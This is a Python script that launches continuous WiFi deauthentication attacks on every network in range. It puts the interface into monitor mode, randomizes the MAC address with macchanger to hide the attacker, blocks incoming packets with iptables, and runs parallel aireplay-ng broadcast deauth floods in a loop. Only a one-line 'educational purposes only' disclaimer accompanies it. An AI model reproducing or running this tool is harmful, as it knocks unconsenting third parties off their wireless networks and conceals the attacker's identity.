import subprocess
import random
import time
import os
import logging
import signal
import sys
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")

class WiFiDeauth:
    def __init__(self, interface: str):
        self.interface = interface
        self.running = True  # Flag to control the deauthentication loop
        signal.signal(signal.SIGINT, self.signal_handler)  # Handle Ctrl+C

    def signal_handler(self, sig, frame):
        """Handles Ctrl+C to gracefully stop the script."""
        logging.info("Ctrl+C detected. Stopping the attack...")
        self.running = False
        self.reset_interface()
        sys.exit(0)

    def random_mac(self) -> str:
        """Generate a random MAC address."""
        return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

    def set_monitor_mode(self):
        """Sets the interface to monitor mode with a randomized MAC."""
        logging.info("Setting monitor mode and randomizing MAC address.")
        try:
            subprocess.check_call(['ifconfig', self.interface, 'down'])
            subprocess.check_call(['iwconfig', self.interface, 'mode', 'monitor'])
            subprocess.check_call(['macchanger', '-m', self.random_mac(), self.interface])
            subprocess.check_call(['ifconfig', self.interface, 'up'])
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to set monitor mode: {e}")
            raise

    def reset_interface(self):
        """Resets the interface to managed mode and restores the original MAC."""
        logging.info("Resetting interface to managed mode.")
        try:
            subprocess.call(['ifconfig', self.interface, 'down'])
            subprocess.call(['macchanger', '-p', self.interface])
            subprocess.call(['iwconfig', self.interface, 'mode', 'managed'])
            subprocess.call(['ifconfig', self.interface, 'up'])
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to reset interface: {e}")
            raise

    def block_all_incoming(self):
        """Adds an iptables rule to drop all incoming packets on the interface."""
        logging.info("Blocking all incoming packets on the interface.")
        try:
            subprocess.call(['iptables', '-A', 'INPUT', '-i', self.interface, '-j', 'DROP'])
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to block incoming packets: {e}")
            raise

    def unblock_all_incoming(self):
        """Removes the iptables rule that drops incoming packets on the interface."""
        logging.info("Unblocking all incoming packets on the interface.")
        try:
            subprocess.call(['iptables', '-D', 'INPUT', '-i', self.interface, '-j', 'DROP'])
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to unblock incoming packets: {e}")
            raise

    def get_networks(self):
        """Scans and retrieves nearby networks' BSSIDs and ESSIDs."""
        logging.info("Scanning for networks...")
        try:
            networks = []
            scan_output = subprocess.check_output(['iwlist', self.interface, 'scan']).decode()

            # Parsing iwlist output to get BSSIDs and ESSIDs
            bssid, essid = None, None
            for line in scan_output.splitlines():
                line = line.strip()
                if "Cell" in line:
                    if bssid and essid:
                        networks.append((bssid, essid))
                    bssid = line.split("Address: ")[1]
                elif "ESSID:" in line:
                    essid = line.split("ESSID:")[1].strip('"')
            if bssid and essid:
                networks.append((bssid, essid))
            logging.info(f"Found {len(networks)} networks.")
            return networks
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to scan networks: {e}")
            return []

    def deauth_network(self, bssid):
        """Performs a deauthentication attack on the specified BSSID."""
        logging.info(f"Attacking BSSID: {bssid}")
        try:
            subprocess.check_call([
                'aireplay-ng', '-0', '0', '-a', bssid, '-c', 'FF:FF:FF:FF:FF:FF', self.interface
            ])
            logging.info(f"Successfully deauthenticated clients on {bssid}")
        except subprocess.CalledProcessError as e:
            logging.error(f"Deauth failed on {bssid}: {e}")

    def deauth_all(self):
        """Deauthenticates every network in range continuously until stopped."""
        if os.geteuid() != 0:
            logging.error("Script requires root privileges.")
            return

        # Check dependencies
        for cmd in ["ifconfig", "iwconfig", "macchanger", "aireplay-ng", "iwlist", "iptables"]:
            if subprocess.call(['which', cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
                logging.error(f"{cmd} is not installed. Please install it and try again.")
                return

        self.set_monitor_mode()
        self.block_all_incoming()  # Block all incoming packets

        try:
            while self.running:
                networks = self.get_networks()
                if not networks:
                    logging.info("No networks found. Retrying in 10 seconds...")
                    time.sleep(10)
                    continue

                logging.info("Starting deauth attacks...")

                # Use ThreadPoolExecutor to run deauth attacks in parallel
                with ThreadPoolExecutor(max_workers=len(networks)) as executor:
                    for bssid, essid in networks:
                        logging.info(f"Scheduling deauth for {essid} ({bssid})")
                        executor.submit(self.deauth_network, bssid)

                logging.info("Sleeping for 10 seconds before re-running the attack.")
                time.sleep(10)

        finally:
            # Remove the iptables block and reset interface after attack
            self.unblock_all_incoming()
            self.reset_interface()
            logging.info("Interface reset to managed mode.")

# Usage
if __name__ == "__main__":
    print("WARNING: This script is for educational purposes only. Use it only on networks you own or have permission to test.")
    attacker = WiFiDeauth(interface="wlan0")  # Replace 'wlan0' with your interface name
    attacker.deauth_all()
